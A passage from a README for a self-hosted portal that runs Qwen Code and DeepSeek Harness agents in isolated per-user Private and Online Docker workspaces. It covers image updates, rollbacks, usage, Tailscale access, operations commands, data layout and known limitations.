  owners and SELinux labels stay) for every user with no workspace running when it starts, and for the others
  at their next start; a workspace that runs through the update keeps running as Private. Online is on for
  everyone unless you set `ONLINE_WORKSPACES=off` in `.env` first (the installer writes `ONLINE_WORKSPACES=on`
  when the line is missing), and the installer opens the Online ports (3301–3499) next to the Private ones.

What this does not update:

- **The agents.** Qwen Code and DeepSeek Harness stay at the versions chosen in the admin console (see
  [Updating the workspace images](#updating-the-workspace-images)).
- **portal-hostd on the LLM server.** After a `git pull` there, run its installer again (`sudo bash
  hostd/install.sh llm --portal PORTAL_IP`); it keeps its token and restarts only if something changed. The
  portal server's copy is updated by `deploy/install.sh`. Until it is updated, the LLM server's network and
  disk readings and its energy per day stay empty.
- **Debian packages inside the images**, Chromium among them. The base images are pinned by digest, so a
  build repeats itself. `sudo bash deploy/update-image.sh --refresh` rebuilds the workspace images with
  today's packages; the pins of the other images move with the repository.
- **SearXNG**, beyond the release this repository pins. To move it yourself, change the `FROM` line in
  `searxng/Dockerfile` as its comment describes and run the installer.
- **The host**: its own packages, Docker and the kernel. After a reboot the firewall and the stack start by
  themselves.

To go back to an earlier state, check out that commit (`git log --oneline` lists them; `git checkout
<commit>`) and run the installer again; `git checkout main` returns to the latest. If you changed files of
the repository yourself (`searxng/settings.yml`, `workspace-image/Dockerfile`), `git pull` keeps your
changes, and stops without changing anything when the update touches the same file: `git stash`, pull, then
`git stash pop`.

## Updating the workspace images

Each agent has its own image, built from `workspace-image/Dockerfile` (one target per agent, on a shared base
with the tools and Chromium) and tagged `workspace-portal/workspace:<agent>-<version>`: `qwen-0.27.0`,
`dsh-0.2.2-rc.1`. Each agent has a current version, and with it the image its workspaces start from: the one
last chosen in the admin console or with `update-image.sh` (kept in `PORTAL_DATA_DIR/config/agent-versions.env`),
else `QWEN_CODE_VERSION` and `DSH_VERSION` from `.env`, the defaults.

**In the admin console** (Admin > Updates), each agent shows its current version and its package images: the
latest five stable releases on npm (with their dates, GitHub release notes and "Breaking changes" when the notes
say so), and every version whose image is on the server. Build one: the gateway builds that image on the server,
checks that it really contains that version (`qwen --version` or `dsh --version`, in a container without network)
and makes it the current version. The build output shows live, and the update can be cancelled; a failed or
cancelled update changes nothing. One update runs at a time. A version whose image is still on the server (an
older one, to go back) is used as it is: checked, without a build or npm. Rebuild the current version to pick up
new Debian packages (Chromium, ...) without the cache. Running workspaces keep their image until they stop; every
new start uses the new version. Images that are not current and that no container uses can be removed there too.

The console builds from the project's `workspace-image/` directory (mounted read-only into the gateway), so an
edit there applies to the next build in the console, as with `update-image.sh`. An image that is already on the
server is only rebuilt when you choose rebuild. Unlike `update-image.sh`, the console doesn't run the isolation
check (it needs root on the host): after an update in the console, run `sudo bash deploy/verify-isolation.sh` on
the server.

**From the command line** (on the server, in the project directory; also when the portal is down):

```sh
sudo bash deploy/update-image.sh qwen 0.28.0     # Qwen Code
sudo bash deploy/update-image.sh dsh 0.2.3       # DeepSeek Harness
```

This builds the image for that version, checks that it really contains it, makes it the current version (in
`PORTAL_DATA_DIR/config/agent-versions.env`, shared with the admin console; it refuses to run while the console
runs an update, and checks again before it saves the version and before it restarts the gateway), restarts the gateway and runs `deploy/verify-isolation.sh` against the new image. Running workspaces keep
the old image until they stop; every new start uses the new one. To move everyone now, stop the running
workspaces in the admin console.

**Roll back** the same way, for example `sudo bash deploy/update-image.sh qwen 0.27.0` (the old image is
still there, so nothing is rebuilt).

**Security updates** for Chromium and the other Debian packages:

```sh
sudo bash deploy/update-image.sh --refresh       # rebuild every enabled agent's current version from a fresh base
sudo bash deploy/update-image.sh dsh --refresh   # just one agent
```

**Add tools or change other versions** by editing `workspace-image/Dockerfile` (for example an
`apt-get install` line in the base stage, or `ARG PLAYWRIGHT_MCP_VERSION`), then run `update-image.sh
--refresh`. Keep the images free of credentials.

Remove old images when you no longer need them, in the admin console or with
`sudo docker image rm workspace-portal/workspace:qwen-0.27.0`.

Check the release notes before upgrading:
- Qwen Code: the gateway relies on `qwen serve`'s token auth, `/health?deep=1` and the
  `daemon.startup.preheat.status` field of `/daemon/status`.
- DeepSeek Harness: the gateway relies on its login cookie format and its `session/list`, `session/state`
  and `job/list` API. The image build checks the rest: it fails, and the current version stays, if a row of
  `workspace-image/dsh/lockdown.patch.yml` doesn't exist in the new version or its agent presets can't be
  adapted. A row the new version simply dropped can be marked `# optional` in the lockdown. Plugins a new
  version adds aren't covered until the lockdown lists them (the network isolation still applies).

If one of these changes, the workspace start and `verify-isolation.sh` show it (`update-image.sh` runs it; after
an update in the admin console, run `sudo bash deploy/verify-isolation.sh` yourself).

## Using it

1. **Admin → New user** creates an account with a one-time temporary password. The user chooses their own at
   first sign-in. The **Online workspace** switch (on by default) lets them use the Online workspace.
2. **Two workspaces per user, one running at a time:** **Private** has no internet access (only the portal's web
   search and page reader reach the internet for it), **Online** reaches the public internet. Each has its own
   files, container, network and browser origin; they never share files and can't reach each other.
3. Signing in opens **Home**: the workspace card with **Start Online** / **Start Private** and, under it, the
   two kinds as cards that say what each allows (Online chosen by default). Start asks first, saying what the
   chosen kind means; **Use Private** / **Use Online** in that dialog flips to the other one, and confirming
   starts it with the user's harness (chosen in **Settings**, Qwen Code by default) in a few seconds and opens it.
   Online can't be chosen (its card says why) when the admin barred the user or `ONLINE_WORKSPACES=off`. While a workspace runs, its kind shows as a
   badge (on Home and in the workspace's bar) and **Open workspace** goes back to it. The page loads the agent
   from that user's own port for that kind (Private `3100 + user id`, Online `3300 + user id` by default), which
   must be reachable. **Stop** (in the workspace's bar or on Home) always asks first, saying whether the agent is
   working or the workspace is open elsewhere, then returns to Home; the other kind can start after that.
4. **One container per user, one harness.** More sign-ins (another tab, browser or device) attach to the same
   container and see the same sessions live. Changing the harness in Settings applies at the next Start, or
   right away with **Restart now** (the same kind again, after a confirmation); files are kept. Settings also holds the password and
   the dark or light theme.
5. **When it stops:**
   - after `IDLE_TIMEOUT_MINUTES` (30) without use, when nothing is running;
   - soon after the user signs out on every device, when nothing is running;
   - when an admin stops it (immediately; the dialog warns if the agent is working).

   It never stops while the agent is working: generating, running a tool or command, waiting for an
   approval, a subagent, a background task, or using the CPU. The idle countdown starts when the work ends. A user who signs out
   mid-task is told the workspace will stop by itself once the task is done.

   Two safety nets stop runaway cases:
   - an approval prompt nobody answers doesn't keep the workspace up: Qwen Code declines it after
     `IDLE_TIMEOUT_MINUTES`; a DeepSeek Harness turn that only waits for an answer doesn't count as work;
   - after `MAX_BUSY_HOURS` (24) without anyone using the workspace, work no longer keeps it running.
6. **Admin console:** **Usage** is the live view of both servers, the LLM sessions and the running
   workspaces with their kind (see [Server monitoring](#server-monitoring-and-llm-engine-updates)). **Users**
   lists everyone with their workspace (and the kind that runs) and harness; open, stop, deactivate, reset or
   delete any user there. A user's page also has their **Online workspace** permission (switching it off stops a
   running Online workspace, after a confirmation) and **Erase Private files…** / **Erase Online files…** (that
   kind's home and workspace folders, refused while it runs). Opening a user's workspace shows them an "Admin
   connected" notice and is audit-logged; a stopped one waits for the admin's choice of Private or Online and
   Start, which launches that user's harness. **Updates** updates, rolls back or rebuilds each agent and updates
   the LLM engine (see "Updating the workspace images").
7. When all `MAX_RUNNING_WORKSPACES` slots are taken, a new start replaces the workspace that has been idle
   longest (over 5 minutes, and never a working one). If there is none, the user sees "try again".

## Remote access with Tailscale

The simplest setup uses the tailnet directly. Tailscale already encrypts the traffic end to end.

1. Install Tailscale on the server and run `tailscale up`.
2. Re-run `sudo bash deploy/install.sh`. When a `tailscale0` interface exists, it also opens 3000,
   3101–3299, 3301–3499, 4101–4299 and 4301–4499 to Tailscale addresses (100.64.0.0/10). With firewalld you can instead put `tailscale0` in a
   trusted zone.
3. Users open `http://<machine>.<tailnet>.ts.net:3000` (MagicDNS) or `http://100.x.y.z:3000`. The workspace
   iframe follows the page's host automatically.

To keep the portal off the LAN entirely, set `FIREWALL_ALLOW_SOURCE=100.64.0.0/10` in `.env` before running
the installer, and remove any LAN rules it added earlier (`sudo firewall-cmd --list-rich-rules`).

The pages are then plain HTTP over the encrypted tunnel, so browsers don't treat them as a "secure context".
Clipboard buttons may ask for permission, and Qwen Code's voice mode is unavailable. HTTPS through
`tailscale serve` would need one serve rule per workspace port. That works in principle, but it is untested
and not set up by the installer.

## Operations

All commands run in the project directory on the server.

```sh
docker compose ps                                              # status
docker compose logs -f gateway web                             # logs (JSON lines)
docker compose logs --tail 50 searxng reader                   # the search engine and the page reader
docker ps --filter label=workspace-portal.workspace=1 \
  --format '{{.Names}} {{.Label "workspace-portal.kind"}} {{.Label "workspace-portal.agent"}} {{.Status}}'   # running workspaces
sudo bash deploy/verify-isolation.sh                           # prove what each kind of workspace can reach
systemctl status portal-hostd                                  # the monitoring daemon (on each server)
sudo nft list table inet workspace_portal                      # the firewall rules (both workspace networks, SearXNG, reader)
docker compose exec web node scripts/reset-admin-password.mjs  # forgot the admin password: prints a temporary one
```

**Data** lives in `PORTAL_DATA_DIR` (`/srv/workspace-portal`):

- `db/portal.sqlite`: accounts, sessions, audit log, LLM usage. It runs in WAL mode; back it up with
  `sqlite3 portal.sqlite ".backup /path/backup.sqlite"`, or stop the stack first.
- `users/<id>/private/` and `users/<id>/online/`: the user's two workspaces, each with
  - `home`: the agents' state (Qwen Code's `~/.qwen`: chats, memory, the user's settings; DeepSeek
    Harness's `~/.dsh` and `~/.agents`: sessions, settings, skills) and caches;
  - `workspace`: the user's files, `/workspace` in the container;
  - `system`: the rendered settings and passwd/group, regenerated at every start.
- `config/qwen`: the admin's Qwen Code settings (also DeepSeek Harness's models).

Deleting a user in the admin console removes their directory (both workspaces). "Erase Private files…" and
"Erase Online files…" on a user's page empty one workspace's `home` and `workspace` (while it is stopped).

**Uninstall:**

```sh
sudo bash deploy/uninstall.sh               # removes the stack, workspaces, firewall and images; keeps the data
sudo bash deploy/uninstall.sh --purge-data  # also deletes PORTAL_DATA_DIR (every account and file)
```

## Development

```sh
npm install
npm run typecheck && npm test && npm run build
npm run dev -w @portal/gateway   # needs Docker; reads ../.env
npm run dev -w @portal/web       # http://localhost:3000; web/test/mock-gateway.mjs fakes the gateway for UI work
                                 # (MOCK_AGENTS=qwen,dsh or =qwen sets the agents it offers)
```

Layout:
- `web/` is the Next.js portal.
- `gateway/` holds the workspace manager, proxies, LLM queue and the MCP server for search and page reading.
- `reader/` is the page reader container: fetching and address checks in Python, HTML to markdown with
  Defuddle in Node.
- `searxng/` is the search engine container: the pinned SearXNG release and its `settings.yml`.
- `packages/db/` is the SQLite schema shared by both.
- `workspace-image/` builds the workspace images: one Dockerfile with a target per agent, the start scripts,
  and DeepSeek Harness's lockdown patch with its build-time preset adaptation and check.
- `gateway/src/agents/` holds what differs per agent: one driver each (`qwen.ts`, `dsh.ts`) and their settings.
- `qwen-config/` holds the example settings.
- `deploy/` has the installer, firewall, config upload, image update, uninstaller and isolation check
  (`lib.sh` holds what they share).

`docs/ARCHITECTURE.md` describes the internals and every API.

## Limitations

- Single host: workspaces run next to the portal. `MAX_RUNNING_WORKSPACES` caps them (4 by default).
- Up to `AGENT_PORT_COUNT - 1` users (199 by default), because each user's workspace of each kind has its own
  port. Raise `AGENT_PORT_COUNT` (and re-run the installer to open the ports) for more; with Online's ports
  right after Private's by default, both ranges grow.
- One workspace per user runs at a time: switching between Private and Online means stopping one and starting
  the other (a few seconds).
- The admin can see everything in every workspace.
- Plain HTTP on the LAN: use Tailscale (above) or a VPN when you leave it.
- Web search depends on public search engines answering this server's address. They block addresses that
  send many queries in a short time; the fallback engines and the search cache soften that, they do not
  remove it.
- The page reader runs no JavaScript and does not pretend to be a browser: pages built in the browser and
  sites that block automated readers come back as a refusal, and the agent has to use another source.
- The LLM queue is per gateway process. Usage is counted per user per day in `llm_usage`, but not shown in the
  UI yet.
- DeepSeek Harness uses the model server's default sampling parameters (temperature, top-p, …), whatever
  `system-defaults.json` says, and offers only models with a context window of at least 82116 tokens.
- DeepSeek Harness 0.2 is a preview release. Its lockdown patch names dsh's plugins by id, so a version that
  renames one fails the image build until the patch is updated (see [Updating the workspace
  images](#updating-the-workspace-images)).

## License

[Apache License 2.0](LICENSE).
